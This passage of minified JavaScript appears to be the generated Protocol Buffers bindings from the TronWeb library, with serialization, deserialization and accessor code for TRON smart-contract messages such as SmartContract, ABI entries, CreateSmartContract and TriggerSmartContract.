            TronWebProto.SmartContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.SmartContract;
                return TronWebProto.SmartContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.SmartContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOriginAddress(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setContractAddress(r);
                        break;
                    case 3:
                        r = new TronWebProto.SmartContract.ABI;
                        t.readMessage(r, TronWebProto.SmartContract.ABI.deserializeBinaryFromReader),
                        e.setAbi(r);
                        break;
                    case 4:
                        r = t.readBytes();
                        e.setBytecode(r);
                        break;
                    case 5:
                        r = t.readInt64();
                        e.setCallValue(r);
                        break;
                    case 6:
                        r = t.readInt64();
                        e.setConsumeUserResourcePercent(r);
                        break;
                    case 7:
                        r = t.readString();
                        e.setName(r);
                        break;
                    case 8:
                        r = t.readInt64();
                        e.setOriginEnergyLimit(r);
                        break;
                    case 9:
                        r = t.readBytes();
                        e.setCodeHash(r);
                        break;
                    case 10:
                        r = t.readBytes();
                        e.setTrxHash(r);
                        break;
                    case 11:
                        r = t.readInt32();
                        e.setVersion(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.SmartContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.SmartContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.SmartContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOriginAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getContractAddress_asU8()).length > 0 && t.writeBytes(2, r),
                null != (r = e.getAbi()) && t.writeMessage(3, r, TronWebProto.SmartContract.ABI.serializeBinaryToWriter),
                (r = e.getBytecode_asU8()).length > 0 && t.writeBytes(4, r),
                0 !== (r = e.getCallValue()) && t.writeInt64(5, r),
                0 !== (r = e.getConsumeUserResourcePercent()) && t.writeInt64(6, r),
                (r = e.getName()).length > 0 && t.writeString(7, r),
                0 !== (r = e.getOriginEnergyLimit()) && t.writeInt64(8, r),
                (r = e.getCodeHash_asU8()).length > 0 && t.writeBytes(9, r),
                (r = e.getTrxHash_asU8()).length > 0 && t.writeBytes(10, r),
                0 !== (r = e.getVersion()) && t.writeInt32(11, r)
            }
            ,
            TronWebProto.SmartContract.ABI.repeatedFields_ = [1],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.SmartContract.ABI.prototype.toObject = function(e) {
                return TronWebProto.SmartContract.ABI.toObject(e, this)
            }
            ,
            TronWebProto.SmartContract.ABI.toObject = function(e, t) {
                var r = {
                    entrysList: n.Message.toObjectList(t.getEntrysList(), TronWebProto.SmartContract.ABI.Entry.toObject, e)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.SmartContract.ABI.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.SmartContract.ABI;
                return TronWebProto.SmartContract.ABI.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.SmartContract.ABI.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    if (1 === t.getFieldNumber()) {
                        var r = new TronWebProto.SmartContract.ABI.Entry;
                        t.readMessage(r, TronWebProto.SmartContract.ABI.Entry.deserializeBinaryFromReader),
                        e.addEntrys(r)
                    } else
                        t.skipField()
                }
                return e
            }
            ,
            TronWebProto.SmartContract.ABI.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.SmartContract.ABI.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.SmartContract.ABI.serializeBinaryToWriter = function(e, t) {
                var r;
                (r = e.getEntrysList()).length > 0 && t.writeRepeatedMessage(1, r, TronWebProto.SmartContract.ABI.Entry.serializeBinaryToWriter)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.repeatedFields_ = [4, 5],
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.SmartContract.ABI.Entry.prototype.toObject = function(e) {
                return TronWebProto.SmartContract.ABI.Entry.toObject(e, this)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.toObject = function(e, t) {
                var r = {
                    anonymous: n.Message.getBooleanFieldWithDefault(t, 1, !1),
                    constant: n.Message.getBooleanFieldWithDefault(t, 2, !1),
                    name: n.Message.getFieldWithDefault(t, 3, ""),
                    inputsList: n.Message.toObjectList(t.getInputsList(), TronWebProto.SmartContract.ABI.Entry.Param.toObject, e),
                    outputsList: n.Message.toObjectList(t.getOutputsList(), TronWebProto.SmartContract.ABI.Entry.Param.toObject, e),
                    type: n.Message.getFieldWithDefault(t, 6, 0),
                    payable: n.Message.getBooleanFieldWithDefault(t, 7, !1),
                    statemutability: n.Message.getFieldWithDefault(t, 8, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.SmartContract.ABI.Entry.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.SmartContract.ABI.Entry;
                return TronWebProto.SmartContract.ABI.Entry.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBool();
                        e.setAnonymous(r);
                        break;
                    case 2:
                        r = t.readBool();
                        e.setConstant(r);
                        break;
                    case 3:
                        r = t.readString();
                        e.setName(r);
                        break;
                    case 4:
                        r = new TronWebProto.SmartContract.ABI.Entry.Param;
                        t.readMessage(r, TronWebProto.SmartContract.ABI.Entry.Param.deserializeBinaryFromReader),
                        e.addInputs(r);
                        break;
                    case 5:
                        r = new TronWebProto.SmartContract.ABI.Entry.Param;
                        t.readMessage(r, TronWebProto.SmartContract.ABI.Entry.Param.deserializeBinaryFromReader),
                        e.addOutputs(r);
                        break;
                    case 6:
                        r = t.readEnum();
                        e.setType(r);
                        break;
                    case 7:
                        r = t.readBool();
                        e.setPayable(r);
                        break;
                    case 8:
                        r = t.readEnum();
                        e.setStatemutability(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.SmartContract.ABI.Entry.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getAnonymous()) && t.writeBool(1, r),
                (r = e.getConstant()) && t.writeBool(2, r),
                (r = e.getName()).length > 0 && t.writeString(3, r),
                (r = e.getInputsList()).length > 0 && t.writeRepeatedMessage(4, r, TronWebProto.SmartContract.ABI.Entry.Param.serializeBinaryToWriter),
                (r = e.getOutputsList()).length > 0 && t.writeRepeatedMessage(5, r, TronWebProto.SmartContract.ABI.Entry.Param.serializeBinaryToWriter),
                0 !== (r = e.getType()) && t.writeEnum(6, r),
                (r = e.getPayable()) && t.writeBool(7, r),
                0 !== (r = e.getStatemutability()) && t.writeEnum(8, r)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.EntryType = {
                UNKNOWNENTRYTYPE: 0,
                CONSTRUCTOR: 1,
                FUNCTION: 2,
                EVENT: 3,
                FALLBACK: 4,
                RECEIVE: 5,
                ERROR: 6
            },
            TronWebProto.SmartContract.ABI.Entry.StateMutabilityType = {
                UNKNOWNMUTABILITYTYPE: 0,
                PURE: 1,
                VIEW: 2,
                NONPAYABLE: 3,
                PAYABLE: 4
            },
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.SmartContract.ABI.Entry.Param.prototype.toObject = function(e) {
                return TronWebProto.SmartContract.ABI.Entry.Param.toObject(e, this)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.Param.toObject = function(e, t) {
                var r = {
                    indexed: n.Message.getBooleanFieldWithDefault(t, 1, !1),
                    name: n.Message.getFieldWithDefault(t, 2, ""),
                    type: n.Message.getFieldWithDefault(t, 3, "")
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.SmartContract.ABI.Entry.Param.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.SmartContract.ABI.Entry.Param;
                return TronWebProto.SmartContract.ABI.Entry.Param.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.Param.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBool();
                        e.setIndexed(r);
                        break;
                    case 2:
                        r = t.readString();
                        e.setName(r);
                        break;
                    case 3:
                        r = t.readString();
                        e.setType(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.Param.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.SmartContract.ABI.Entry.Param.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.Param.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getIndexed()) && t.writeBool(1, r),
                (r = e.getName()).length > 0 && t.writeString(2, r),
                (r = e.getType()).length > 0 && t.writeString(3, r)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.Param.prototype.getIndexed = function() {
                return n.Message.getBooleanFieldWithDefault(this, 1, !1)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.Param.prototype.setIndexed = function(e) {
                return n.Message.setProto3BooleanField(this, 1, e)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.Param.prototype.getName = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.Param.prototype.setName = function(e) {
                return n.Message.setProto3StringField(this, 2, e)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.Param.prototype.getType = function() {
                return n.Message.getFieldWithDefault(this, 3, "")
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.Param.prototype.setType = function(e) {
                return n.Message.setProto3StringField(this, 3, e)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.getAnonymous = function() {
                return n.Message.getBooleanFieldWithDefault(this, 1, !1)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.setAnonymous = function(e) {
                return n.Message.setProto3BooleanField(this, 1, e)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.getConstant = function() {
                return n.Message.getBooleanFieldWithDefault(this, 2, !1)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.setConstant = function(e) {
                return n.Message.setProto3BooleanField(this, 2, e)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.getName = function() {
                return n.Message.getFieldWithDefault(this, 3, "")
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.setName = function(e) {
                return n.Message.setProto3StringField(this, 3, e)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.getInputsList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.SmartContract.ABI.Entry.Param, 4)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.setInputsList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 4, e)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.addInputs = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 4, e, TronWebProto.SmartContract.ABI.Entry.Param, t)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.clearInputsList = function() {
                return this.setInputsList([])
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.getOutputsList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.SmartContract.ABI.Entry.Param, 5)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.setOutputsList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 5, e)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.addOutputs = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 5, e, TronWebProto.SmartContract.ABI.Entry.Param, t)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.clearOutputsList = function() {
                return this.setOutputsList([])
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.getType = function() {
                return n.Message.getFieldWithDefault(this, 6, 0)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.setType = function(e) {
                return n.Message.setProto3EnumField(this, 6, e)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.getPayable = function() {
                return n.Message.getBooleanFieldWithDefault(this, 7, !1)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.setPayable = function(e) {
                return n.Message.setProto3BooleanField(this, 7, e)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.getStatemutability = function() {
                return n.Message.getFieldWithDefault(this, 8, 0)
            }
            ,
            TronWebProto.SmartContract.ABI.Entry.prototype.setStatemutability = function(e) {
                return n.Message.setProto3EnumField(this, 8, e)
            }
            ,
            TronWebProto.SmartContract.ABI.prototype.getEntrysList = function() {
                return n.Message.getRepeatedWrapperField(this, TronWebProto.SmartContract.ABI.Entry, 1)
            }
            ,
            TronWebProto.SmartContract.ABI.prototype.setEntrysList = function(e) {
                return n.Message.setRepeatedWrapperField(this, 1, e)
            }
            ,
            TronWebProto.SmartContract.ABI.prototype.addEntrys = function(e, t) {
                return n.Message.addToRepeatedWrapperField(this, 1, e, TronWebProto.SmartContract.ABI.Entry, t)
            }
            ,
            TronWebProto.SmartContract.ABI.prototype.clearEntrysList = function() {
                return this.setEntrysList([])
            }
            ,
            TronWebProto.SmartContract.prototype.getOriginAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.SmartContract.prototype.getOriginAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOriginAddress())
            }
            ,
            TronWebProto.SmartContract.prototype.getOriginAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOriginAddress())
            }
            ,
            TronWebProto.SmartContract.prototype.setOriginAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.SmartContract.prototype.getContractAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.SmartContract.prototype.getContractAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getContractAddress())
            }
            ,
            TronWebProto.SmartContract.prototype.getContractAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getContractAddress())
            }
            ,
            TronWebProto.SmartContract.prototype.setContractAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.SmartContract.prototype.getAbi = function() {
                return n.Message.getWrapperField(this, TronWebProto.SmartContract.ABI, 3)
            }
            ,
            TronWebProto.SmartContract.prototype.setAbi = function(e) {
                return n.Message.setWrapperField(this, 3, e)
            }
            ,
            TronWebProto.SmartContract.prototype.clearAbi = function() {
                return this.setAbi(void 0)
            }
            ,
            TronWebProto.SmartContract.prototype.hasAbi = function() {
                return null != n.Message.getField(this, 3)
            }
            ,
            TronWebProto.SmartContract.prototype.getBytecode = function() {
                return n.Message.getFieldWithDefault(this, 4, "")
            }
            ,
            TronWebProto.SmartContract.prototype.getBytecode_asB64 = function() {
                return n.Message.bytesAsB64(this.getBytecode())
            }
            ,
            TronWebProto.SmartContract.prototype.getBytecode_asU8 = function() {
                return n.Message.bytesAsU8(this.getBytecode())
            }
            ,
            TronWebProto.SmartContract.prototype.setBytecode = function(e) {
                return n.Message.setProto3BytesField(this, 4, e)
            }
            ,
            TronWebProto.SmartContract.prototype.getCallValue = function() {
                return n.Message.getFieldWithDefault(this, 5, 0)
            }
            ,
            TronWebProto.SmartContract.prototype.setCallValue = function(e) {
                return n.Message.setProto3IntField(this, 5, e)
            }
            ,
            TronWebProto.SmartContract.prototype.getConsumeUserResourcePercent = function() {
                return n.Message.getFieldWithDefault(this, 6, 0)
            }
            ,
            TronWebProto.SmartContract.prototype.setConsumeUserResourcePercent = function(e) {
                return n.Message.setProto3IntField(this, 6, e)
            }
            ,
            TronWebProto.SmartContract.prototype.getName = function() {
                return n.Message.getFieldWithDefault(this, 7, "")
            }
            ,
            TronWebProto.SmartContract.prototype.setName = function(e) {
                return n.Message.setProto3StringField(this, 7, e)
            }
            ,
            TronWebProto.SmartContract.prototype.getOriginEnergyLimit = function() {
                return n.Message.getFieldWithDefault(this, 8, 0)
            }
            ,
            TronWebProto.SmartContract.prototype.setOriginEnergyLimit = function(e) {
                return n.Message.setProto3IntField(this, 8, e)
            }
            ,
            TronWebProto.SmartContract.prototype.getCodeHash = function() {
                return n.Message.getFieldWithDefault(this, 9, "")
            }
            ,
            TronWebProto.SmartContract.prototype.getCodeHash_asB64 = function() {
                return n.Message.bytesAsB64(this.getCodeHash())
            }
            ,
            TronWebProto.SmartContract.prototype.getCodeHash_asU8 = function() {
                return n.Message.bytesAsU8(this.getCodeHash())
            }
            ,
            TronWebProto.SmartContract.prototype.setCodeHash = function(e) {
                return n.Message.setProto3BytesField(this, 9, e)
            }
            ,
            TronWebProto.SmartContract.prototype.getTrxHash = function() {
                return n.Message.getFieldWithDefault(this, 10, "")
            }
            ,
            TronWebProto.SmartContract.prototype.getTrxHash_asB64 = function() {
                return n.Message.bytesAsB64(this.getTrxHash())
            }
            ,
            TronWebProto.SmartContract.prototype.getTrxHash_asU8 = function() {
                return n.Message.bytesAsU8(this.getTrxHash())
            }
            ,
            TronWebProto.SmartContract.prototype.setTrxHash = function(e) {
                return n.Message.setProto3BytesField(this, 10, e)
            }
            ,
            TronWebProto.SmartContract.prototype.getVersion = function() {
                return n.Message.getFieldWithDefault(this, 11, 0)
            }
            ,
            TronWebProto.SmartContract.prototype.setVersion = function(e) {
                return n.Message.setProto3IntField(this, 11, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.ContractState.prototype.toObject = function(e) {
                return TronWebProto.ContractState.toObject(e, this)
            }
            ,
            TronWebProto.ContractState.toObject = function(e, t) {
                var r = {
                    energyUsage: n.Message.getFieldWithDefault(t, 1, 0),
                    energyFactor: n.Message.getFieldWithDefault(t, 2, 0),
                    updateCycle: n.Message.getFieldWithDefault(t, 3, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.ContractState.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.ContractState;
                return TronWebProto.ContractState.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.ContractState.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readInt64();
                        e.setEnergyUsage(r);
                        break;
                    case 2:
                        r = t.readInt64();
                        e.setEnergyFactor(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setUpdateCycle(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.ContractState.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.ContractState.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.ContractState.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                0 !== (r = e.getEnergyUsage()) && t.writeInt64(1, r),
                0 !== (r = e.getEnergyFactor()) && t.writeInt64(2, r),
                0 !== (r = e.getUpdateCycle()) && t.writeInt64(3, r)
            }
            ,
            TronWebProto.ContractState.prototype.getEnergyUsage = function() {
                return n.Message.getFieldWithDefault(this, 1, 0)
            }
            ,
            TronWebProto.ContractState.prototype.setEnergyUsage = function(e) {
                return n.Message.setProto3IntField(this, 1, e)
            }
            ,
            TronWebProto.ContractState.prototype.getEnergyFactor = function() {
                return n.Message.getFieldWithDefault(this, 2, 0)
            }
            ,
            TronWebProto.ContractState.prototype.setEnergyFactor = function(e) {
                return n.Message.setProto3IntField(this, 2, e)
            }
            ,
            TronWebProto.ContractState.prototype.getUpdateCycle = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.ContractState.prototype.setUpdateCycle = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.CreateSmartContract.prototype.toObject = function(e) {
                return TronWebProto.CreateSmartContract.toObject(e, this)
            }
            ,
            TronWebProto.CreateSmartContract.toObject = function(e, t) {
                var r, o = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    newContract: (r = t.getNewContract()) && TronWebProto.SmartContract.toObject(e, r),
                    callTokenValue: n.Message.getFieldWithDefault(t, 3, 0),
                    tokenId: n.Message.getFieldWithDefault(t, 4, 0)
                };
                return e && (o.$jspbMessageInstance = t),
                o
            }
            ),
            TronWebProto.CreateSmartContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.CreateSmartContract;
                return TronWebProto.CreateSmartContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.CreateSmartContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = new TronWebProto.SmartContract;
                        t.readMessage(r, TronWebProto.SmartContract.deserializeBinaryFromReader),
                        e.setNewContract(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setCallTokenValue(r);
                        break;
                    case 4:
                        r = t.readInt64();
                        e.setTokenId(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.CreateSmartContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.CreateSmartContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.CreateSmartContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                null != (r = e.getNewContract()) && t.writeMessage(2, r, TronWebProto.SmartContract.serializeBinaryToWriter),
                0 !== (r = e.getCallTokenValue()) && t.writeInt64(3, r),
                0 !== (r = e.getTokenId()) && t.writeInt64(4, r)
            }
            ,
            TronWebProto.CreateSmartContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.CreateSmartContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.CreateSmartContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.CreateSmartContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.CreateSmartContract.prototype.getNewContract = function() {
                return n.Message.getWrapperField(this, TronWebProto.SmartContract, 2)
            }
            ,
            TronWebProto.CreateSmartContract.prototype.setNewContract = function(e) {
                return n.Message.setWrapperField(this, 2, e)
            }
            ,
            TronWebProto.CreateSmartContract.prototype.clearNewContract = function() {
                return this.setNewContract(void 0)
            }
            ,
            TronWebProto.CreateSmartContract.prototype.hasNewContract = function() {
                return null != n.Message.getField(this, 2)
            }
            ,
            TronWebProto.CreateSmartContract.prototype.getCallTokenValue = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.CreateSmartContract.prototype.setCallTokenValue = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.CreateSmartContract.prototype.getTokenId = function() {
                return n.Message.getFieldWithDefault(this, 4, 0)
            }
            ,
            TronWebProto.CreateSmartContract.prototype.setTokenId = function(e) {
                return n.Message.setProto3IntField(this, 4, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.TriggerSmartContract.prototype.toObject = function(e) {
                return TronWebProto.TriggerSmartContract.toObject(e, this)
            }
            ,
            TronWebProto.TriggerSmartContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    contractAddress: t.getContractAddress_asB64(),
                    callValue: n.Message.getFieldWithDefault(t, 3, 0),
                    data: t.getData_asB64(),
                    callTokenValue: n.Message.getFieldWithDefault(t, 5, 0),
                    tokenId: n.Message.getFieldWithDefault(t, 6, 0)
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.TriggerSmartContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.TriggerSmartContract;
                return TronWebProto.TriggerSmartContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.TriggerSmartContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setContractAddress(r);
                        break;
                    case 3:
                        r = t.readInt64();
                        e.setCallValue(r);
                        break;
                    case 4:
                        r = t.readBytes();
                        e.setData(r);
                        break;
                    case 5:
                        r = t.readInt64();
                        e.setCallTokenValue(r);
                        break;
                    case 6:
                        r = t.readInt64();
                        e.setTokenId(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.serializeBinary = function() {
                var e = new n.BinaryWriter;
                return TronWebProto.TriggerSmartContract.serializeBinaryToWriter(this, e),
                e.getResultBuffer()
            }
            ,
            TronWebProto.TriggerSmartContract.serializeBinaryToWriter = function(e, t) {
                var r = void 0;
                (r = e.getOwnerAddress_asU8()).length > 0 && t.writeBytes(1, r),
                (r = e.getContractAddress_asU8()).length > 0 && t.writeBytes(2, r),
                0 !== (r = e.getCallValue()) && t.writeInt64(3, r),
                (r = e.getData_asU8()).length > 0 && t.writeBytes(4, r),
                0 !== (r = e.getCallTokenValue()) && t.writeInt64(5, r),
                0 !== (r = e.getTokenId()) && t.writeInt64(6, r)
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getOwnerAddress = function() {
                return n.Message.getFieldWithDefault(this, 1, "")
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getOwnerAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getOwnerAddress())
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getOwnerAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getOwnerAddress())
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.setOwnerAddress = function(e) {
                return n.Message.setProto3BytesField(this, 1, e)
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getContractAddress = function() {
                return n.Message.getFieldWithDefault(this, 2, "")
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getContractAddress_asB64 = function() {
                return n.Message.bytesAsB64(this.getContractAddress())
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getContractAddress_asU8 = function() {
                return n.Message.bytesAsU8(this.getContractAddress())
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.setContractAddress = function(e) {
                return n.Message.setProto3BytesField(this, 2, e)
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getCallValue = function() {
                return n.Message.getFieldWithDefault(this, 3, 0)
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.setCallValue = function(e) {
                return n.Message.setProto3IntField(this, 3, e)
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getData = function() {
                return n.Message.getFieldWithDefault(this, 4, "")
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getData_asB64 = function() {
                return n.Message.bytesAsB64(this.getData())
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getData_asU8 = function() {
                return n.Message.bytesAsU8(this.getData())
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.setData = function(e) {
                return n.Message.setProto3BytesField(this, 4, e)
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getCallTokenValue = function() {
                return n.Message.getFieldWithDefault(this, 5, 0)
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.setCallTokenValue = function(e) {
                return n.Message.setProto3IntField(this, 5, e)
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.getTokenId = function() {
                return n.Message.getFieldWithDefault(this, 6, 0)
            }
            ,
            TronWebProto.TriggerSmartContract.prototype.setTokenId = function(e) {
                return n.Message.setProto3IntField(this, 6, e)
            }
            ,
            n.Message.GENERATE_TO_OBJECT && (TronWebProto.ClearABIContract.prototype.toObject = function(e) {
                return TronWebProto.ClearABIContract.toObject(e, this)
            }
            ,
            TronWebProto.ClearABIContract.toObject = function(e, t) {
                var r = {
                    ownerAddress: t.getOwnerAddress_asB64(),
                    contractAddress: t.getContractAddress_asB64()
                };
                return e && (r.$jspbMessageInstance = t),
                r
            }
            ),
            TronWebProto.ClearABIContract.deserializeBinary = function(e) {
                var t = new n.BinaryReader(e)
                  , r = new TronWebProto.ClearABIContract;
                return TronWebProto.ClearABIContract.deserializeBinaryFromReader(r, t)
            }
            ,
            TronWebProto.ClearABIContract.deserializeBinaryFromReader = function(e, t) {
                for (; t.nextField() && !t.isEndGroup(); ) {
                    switch (t.getFieldNumber()) {
                    case 1:
                        var r = t.readBytes();
                        e.setOwnerAddress(r);
                        break;
                    case 2:
                        r = t.readBytes();
                        e.setContractAddress(r);
                        break;
                    default:
                        t.skipField()
                    }
                }
                return e
            }
            ,
